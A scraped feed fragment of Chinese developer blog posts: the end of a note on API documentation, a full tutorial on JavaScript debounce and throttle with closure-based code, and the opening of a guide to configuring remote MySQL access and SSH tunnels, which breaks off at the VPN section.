<p>一个好的 API 必须配有清晰的文档。</p>
<p>文档应包含：</p>
<ul>
<li>接口地址</li>
<li>请求方式</li>
<li>参数说明</li>
<li>返回示例</li>
<li>错误说明</li>
</ul>
<p>完善的接口文档，是高效协作的基础。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[防抖与节流：前端性能优化的两大利器]]></title>    <link>https://juejin.cn/post/7590071125398077480</link>    <guid>https://juejin.cn/post/7590071125398077480</guid>    <pubDate>2026-01-02T05:50:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590071125398077480" data-draft-id="7590054976489259048" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="防抖与节流：前端性能优化的两大利器"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2026-01-02T05:50:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ohyeah"/> <meta itemprop="url" content="https://juejin.cn/user/740446536480618"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            防抖与节流：前端性能优化的两大利器
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/740446536480618/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ohyeah
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T05:50:07.000Z" title="Fri Jan 02 2026 05:50:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在现代 Web 开发中，用户交互越来越频繁，而每一次交互都可能触发复杂的逻辑处理或网络请求。如果不加以控制，这些高频操作会带来严重的性能问题。为此，<strong>防抖（Debounce）</strong> 与 <strong>节流（Throttle）</strong> 成为了前端开发中不可或缺的性能优化手段。</p>
<p>本文将结合一段实际代码和详细注释，深入浅出地讲解防抖与节流的核心思想、实现方式以及适用场景，并重点解析其中的关键逻辑。</p>
<hr/>
<h2 data-id="heading-0">一、为什么需要防抖和节流？</h2>
<p>设想这样一个场景：用户在搜索框中输入关键词，每按一次键就发起一次 AJAX 请求获取搜索建议。如果用户快速输入“react”，那么会依次触发 <code>r</code> → <code>re</code> → <code>rea</code> → <code>reac</code> → <code>react</code> 五次请求。</p>
<ul>
<li><strong>问题1：请求开销大</strong><br/>
每次请求都需要消耗带宽、服务器资源，甚至可能造成接口限流。</li>
<li><strong>问题2：用户体验差</strong><br/>
如果请求响应慢，旧的请求结果可能会覆盖新的输入内容，导致显示错乱。</li>
</ul>
<p>因此，我们需要一种机制来<strong>减少不必要的执行次数</strong>，只保留关键的操作。这就是防抖和节流要解决的问题。</p>
<blockquote>
<p><strong>防抖</strong>：在一定时间内，只执行最后一次操作。<br/>
<strong>节流</strong>：每隔固定时间，最多执行一次操作。</p>
</blockquote>
<hr/>
<h2 data-id="heading-1">二、防抖（Debounce）——“只认最后一次”</h2>
<h3 data-id="heading-2">1. 核心思想</h3>
<blockquote>
<p><strong>无论执行多少次，只执行最后一次。</strong></p>
</blockquote>
<p>就像王者荣耀中的“回城”技能：如果你在回城过程中被攻击，回城会被打断并重新计时。只有当你完整地等待一段时间后，回城才会真正生效。</p>
<h3 data-id="heading-3">2. 代码实现与闭包应用</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 高阶函数 参数或者返回值是函数 (返回值是函数 -&gt; 闭包)</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">debounce</span>(<span class="hljs-params">fn, delay</span>) {
  <span class="hljs-keyword">var</span> id; <span class="hljs-comment">// 自由变量，闭包保存</span>
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>) {
    <span class="hljs-keyword">if</span> (id) <span class="hljs-built_in">clearTimeout</span>(id); <span class="hljs-comment">// 清除已有定时器，重新计时</span>
    <span class="hljs-keyword">var</span> that = <span class="hljs-variable language_">this</span>; <span class="hljs-comment">// 保存 this 上下文</span>
    id = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
      fn.<span class="hljs-title function_">call</span>(that, args); <span class="hljs-comment">// 延迟执行原函数 并绑定正确的this和参数</span>
    }, delay);
    <span class="hljs-comment">// 这样只有最后一次触发后等待delay毫秒后才会真正执行</span>
  };
}
</code></pre>
<h4 data-id="heading-4">关键点解析：</h4>
<ul>
<li><strong>闭包的作用</strong>：<code>id</code> 是一个自由变量，被返回的函数所引用，从而在多次调用之间保持状态。这使得每次触发都能访问并清除上一次的定时器。</li>
<li><strong><code>clearTimeout(id)</code></strong> ：确保只有最后一次触发后的 <code>delay</code> 时间才会真正执行函数。</li>
<li><strong><code>this</code> 和参数传递</strong>：通过 <code>call</code> 或 <code>apply</code> 确保原函数在正确的上下文中执行，并传入正确的参数。</li>
</ul>
<h3 data-id="heading-5">3. 使用示例</h3>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">inputb</span> = document.getElementById(<span class="hljs-string">'debounce'</span>)<span class="hljs-comment">;</span>
let <span class="hljs-attr">debounceAjax</span> = debounce(ajax, <span class="hljs-number">200</span>)<span class="hljs-comment">;</span>
inputb.addEventListener('keyup', function(e) {
  debounceAjax(e.target.value)<span class="hljs-comment">;</span>
})<span class="hljs-comment">;</span>
</code></pre>
<p>用户快速输入时，只有停止输入 200ms 后，才会发送最终的完整关键词请求，极大减少了无效请求。</p>
<hr/>
<h2 data-id="heading-6">三、节流（Throttle）——“冷却期内不执行，但最后补一次”</h2>
<h3 data-id="heading-7">1. 核心思想</h3>
<blockquote>
<p><strong>每隔一定时间，最多执行一次。</strong></p>
</blockquote>
<p>但注意：我们实现的是<strong>带尾随执行（trailing）的节流</strong>，即在冷却期结束后，如果期间有触发，会<strong>补一次执行</strong>。</p>
<blockquote>
<p>就像技能有 CD（冷却时间），但如果你在 CD 期间一直按技能，CD 结束后会自动释放一次。</p>
</blockquote>
<h3 data-id="heading-8">2. 代码实现与“尾随执行”逻辑</h3>
<pre><code class="hljs language-ini" lang="ini">function throttle(fn, delay) {
  let last, deferTimer<span class="hljs-comment">; // last上一次执行事件  deferTimer延迟执行的定时器</span>
  return function() {
    let <span class="hljs-attr">that</span> = this<span class="hljs-comment">;  </span>
    let <span class="hljs-attr">_args</span> = arguments<span class="hljs-comment">; // 类数组对象 保存所有参数</span>
    let <span class="hljs-attr">now</span> = +new Date()<span class="hljs-comment">; // 拿到当前时间戳  +强制类型转换 毫秒数</span>

    if (last &amp;&amp; now &lt; last + delay) {
      // 处于冷却期 上次执行时间存在 且当前时间还没到下次允许执行的时间
      clearTimeout(deferTimer)<span class="hljs-comment">;</span>
      <span class="hljs-attr">deferTimer</span> = setTimeout(function() {
        <span class="hljs-attr">last</span> = now<span class="hljs-comment">;</span>
        fn.apply(that, _args)<span class="hljs-comment">;</span>
      }, delay)<span class="hljs-comment">;</span>
    } else {
      // 已过冷却期，立即执行
      <span class="hljs-attr">last</span> = now<span class="hljs-comment">;</span>
      fn.apply(that, _args)<span class="hljs-comment">;</span>
    }
  }<span class="hljs-comment">;</span>
}
</code></pre>
<h4 data-id="heading-9">重点解析 <code>if (last &amp;&amp; now &lt; last + delay)</code> 分支：</h4>
<ul>
<li><strong>条件成立含义</strong>：已经执行过至少一次（<code>last</code> 存在），且当前时间距离上次执行不足 <code>delay</code> 毫秒 → 正处于冷却期。</li>
<li><strong>但不能忽略这次触发</strong>！因为这可能是用户最后一次有效操作（比如完整输入了“react”）。</li>
<li>所以我们<strong>设置一个延迟定时器</strong>，计划在冷却期结束后执行。</li>
<li><strong><code>clearTimeout(deferTimer)</code> 的作用</strong>：用户可能在冷却期内多次触发，但我们只关心<strong>最后一次</strong>，所以每次都要清除旧的定时器，只保留最新的。</li>
</ul>
<h3 data-id="heading-10">3. 为什么需要“尾随执行”？</h3>
<blockquote>
<p><strong>核心原因：避免丢失最后一次有效操作。</strong></p>
</blockquote>
<p>假设用户想搜 “react”，在 200ms 内快速打完，而节流 delay = 500ms：</p>
<ul>
<li>
<p><strong>简单节流（无尾随）</strong> ：</p>
<ul>
<li><code>r</code>（0ms）→ 立即执行</li>
<li><code>re</code>（100ms）→ 被忽略</li>
<li><code>rea</code>（150ms）→ 被忽略</li>
<li><code>react</code>（200ms）→ 被忽略<br/>
→ 用户停止输入 但永远不会发送'react' 搜索框显示的是r的结果 <strong>而不是用户真正想搜的react</strong></li>
</ul>
</li>
<li>
<p><strong>带尾随的节流</strong>：</p>
<ul>
<li><code>r</code>（0ms）→ 立即执行（<code>last = 0</code>）</li>
<li><code>re</code>（100ms）→ 冷却期，设 timer（600ms 执行）</li>
<li><code>rea</code>（150ms）→ 更新 timer（650ms）</li>
<li><code>react</code>（200ms）→ 更新 timer（700ms）<br/>
→ 用户停止输入后，在 700ms 自动执行 <code>ajax('react')</code>，<strong>结果正确</strong>！</li>
</ul>
</li>
</ul>
<h3 data-id="heading-11">4. 什么时候不需要尾随？</h3>
<blockquote>
<p><strong>按钮防连点</strong>：用户点击“提交”按钮，你希望 2 秒内只能点一次。<br/>
这种情况下，<strong>不需要在 2 秒后自动再提交一次</strong>！此时应使用<strong>无尾随的简单节流</strong>。</p>
</blockquote>
<hr/>
<h2 data-id="heading-12">四、防抖 vs 节流：如何选择？</h2>






























<table><thead><tr><th>特性</th><th>防抖（Debounce）</th><th>节流（Throttle）</th></tr></thead><tbody><tr><td>执行时机</td><td>停止触发后 <code>delay</code> ms 执行</td><td>每隔 <code>delay</code> ms 最多执行一次</td></tr><tr><td>是否保证最后一次</td><td>✅ 是</td><td>✅（带尾随时）</td></tr><tr><td>典型场景</td><td>搜索建议、窗口 resize</td><td>滚动加载、鼠标移动、按钮点击（防连点）</td></tr><tr><td>类比</td><td>回城技能（被打断重计时）</td><td>技能 CD（冷却后可再放）</td></tr></tbody></table>
<blockquote>
<ul>
<li><strong>搜索建议 → 用防抖</strong>：用户输入是连续的，我们只关心最终结果。</li>
<li><strong>滚动加载 → 用节流</strong>：用户持续滚动，我们需要定期检查是否到底部，不能等到停止滚动才加载。</li>
</ul>
</blockquote>
<hr/>
<h2 data-id="heading-13">五、总结</h2>
<p>防抖和节流虽然都是用于<strong>限制函数执行频率</strong>，但它们的<strong>触发逻辑和适用场景截然不同</strong>：</p>
<ul>
<li><strong>防抖</strong>强调“<strong>只执行最后一次</strong>”，适用于<strong>用户意图明确、操作连续</strong>的场景，如搜索、表单校验。</li>
<li><strong>节流</strong>强调“<strong>定期执行</strong>”，适用于<strong>高频但需周期性响应</strong>的场景，如滚动、拖拽、游戏帧更新。</li>
</ul>
<p>而我们在实现节流时，特别加入了<strong>尾随执行（trailing）</strong> 机制，这是为了<strong>兼顾性能与用户体验</strong>——既避免了过度请求，又确保不会丢失用户的最终操作。</p>
<blockquote>
<p>正如注释中所说：<br/>
<strong>“核心原因：避免丢失最后一次有效操作。”</strong></p>
</blockquote>
<p>通过合理运用闭包、定时器和上下文绑定，我们不仅实现了功能，还保证了代码的健壮性和可复用性。这些技巧，正是前端工程师在性能优化道路上的必备武器。</p>
<hr/>
<p><strong>小提示</strong>：在实际项目中，Lodash 等工具库已提供了成熟的 <code>debounce</code> 和 <code>throttle</code> 实现，支持更多选项（如 <code>leading</code>、<code>trailing</code> 开关）。但理解其底层原理，才能在复杂场景中灵活应对。</p>
<p>希望本文能帮助你更清晰地掌握防抖与节流的本质。欢迎在评论区分享你的使用经验！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MySQL远程连接配置与安全实战]]></title>    <link>https://juejin.cn/post/7589940210831114283</link>    <guid>https://juejin.cn/post/7589940210831114283</guid>    <pubDate>2026-01-02T05:00:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589940210831114283" data-draft-id="7589940210831097899" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" MySQL远程连接配置与安全实战"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-02T05:00:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="嘻哈baby"/> <meta itemprop="url" content="https://juejin.cn/user/485305583405066"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             MySQL远程连接配置与安全实战
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/485305583405066/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    嘻哈baby
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T05:00:27.000Z" title="Fri Jan 02 2026 05:00:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>本地开发连公司数据库，在家连公司测试环境，远程运维生产库...</p>
<p>MySQL远程连接是刚需，但配置不当就是安全隐患。这篇整理一下远程连接的正确姿势。</p>
<hr/>
<h2 data-id="heading-0">为什么连不上？</h2>
<p>先说最常见的问题：MySQL装好了，远程连不上。</p>
<p>原因通常就这几个：</p>
<h3 data-id="heading-1">1. MySQL没有监听外网</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 查看MySQL监听地址</span>
netstat -tlnp | grep 3306

<span class="hljs-comment"># 如果显示 127.0.0.1:3306，说明只监听本地</span>
<span class="hljs-comment"># 需要改成 0.0.0.0:3306 或具体IP</span>
</code></pre>
<p>修改配置：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># /etc/mysql/mysql.conf.d/mysqld.cnf 或 /etc/my.cnf</span>
<span class="hljs-section">[mysqld]</span>
<span class="hljs-attr">bind-address</span> = <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>
</code></pre>
<p>重启MySQL：</p>
<pre><code class="hljs language-bash" lang="bash">systemctl restart mysql
</code></pre>
<h3 data-id="heading-2">2. 用户没有远程权限</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 查看用户权限</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">user</span>, host <span class="hljs-keyword">FROM</span> mysql.user;

<span class="hljs-comment">-- 如果host是localhost，就只能本地连</span>
<span class="hljs-comment">-- user: root, host: localhost  ← 只能本地</span>
<span class="hljs-comment">-- user: root, host: %          ← 可以任意IP连接</span>
</code></pre>
<p>创建远程用户或修改权限：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 方式1：创建新用户</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">'dev'</span>@<span class="hljs-string">'%'</span> IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">'your_password'</span>;
<span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">ALL</span> PRIVILEGES <span class="hljs-keyword">ON</span> your_db.<span class="hljs-operator">*</span> <span class="hljs-keyword">TO</span> <span class="hljs-string">'dev'</span>@<span class="hljs-string">'%'</span>;
FLUSH PRIVILEGES;

<span class="hljs-comment">-- 方式2：修改现有用户（不推荐直接改root）</span>
<span class="hljs-comment">-- MySQL 8.0</span>
<span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">'root'</span>@<span class="hljs-string">'%'</span> IDENTIFIED <span class="hljs-keyword">WITH</span> mysql_native_password <span class="hljs-keyword">BY</span> <span class="hljs-string">'your_password'</span>;
</code></pre>
<h3 data-id="heading-3">3. 防火墙拦截</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 查看防火墙状态</span>
ufw status
<span class="hljs-comment"># 或</span>
firewall-cmd --list-all

<span class="hljs-comment"># 开放3306端口</span>
ufw allow 3306
<span class="hljs-comment"># 或</span>
firewall-cmd --permanent --add-port=3306/tcp
firewall-cmd --reload
</code></pre>
<h3 data-id="heading-4">4. 云服务器安全组</h3>
<p>如果是云服务器，还要在控制台开安全组：</p>
<pre><code class="hljs language-makefile" lang="makefile">入站规则：
<span class="hljs-section">协议: TCP</span>
<span class="hljs-section">端口: 3306</span>
<span class="hljs-section">来源: 0.0.0.0/0 (或指定IP)</span>
</code></pre>
<hr/>
<h2 data-id="heading-5">远程连接的几种方式</h2>
<h3 data-id="heading-6">1. 直接连接（不推荐）</h3>
<pre><code class="hljs language-bash" lang="bash">mysql -h 公网IP -P 3306 -u dev -p
</code></pre>
<p>问题：</p>
<ul>
<li>3306端口暴露在公网，容易被扫描攻击</li>
<li>密码在网络上明文传输（除非用SSL）</li>
<li>安全隐患很大</li>
</ul>
<h3 data-id="heading-7">2. SSH隧道（推荐）</h3>
<p>通过SSH建立加密隧道，MySQL流量走SSH通道：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 本地执行</span>
ssh -L 3307:localhost:3306 user@server_ip

<span class="hljs-comment"># 然后连接本地3307端口</span>
mysql -h 127.0.0.1 -P 3307 -u dev -p
</code></pre>
<p>或者用Navicat/DataGrip等工具的SSH隧道功能：</p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">SSH主机: server_ip</span>
<span class="hljs-section">SSH用户: user</span>
<span class="hljs-section">SSH密钥: ~/.ssh/id_rsa</span>

<span class="hljs-section">MySQL主机: localhost (注意是localhost，不是server_ip)</span>
<span class="hljs-section">MySQL端口: 3306</span>
</code></pre>
<p>优点：</p>
<ul>
<li>MySQL端口不用暴露公网</li>
<li>流量加密</li>
<li>可以用SSH密钥认证</li>
</ul>
<h3 data-id="heading-8">3. VPN/组网方案</h3>
<p>如果经常需要连接，每次建SSH隧道挺麻烦的。</p>
<p>更好的方式是组建虚拟局域网，让你的电脑和服务器像在同一个内网：</p>
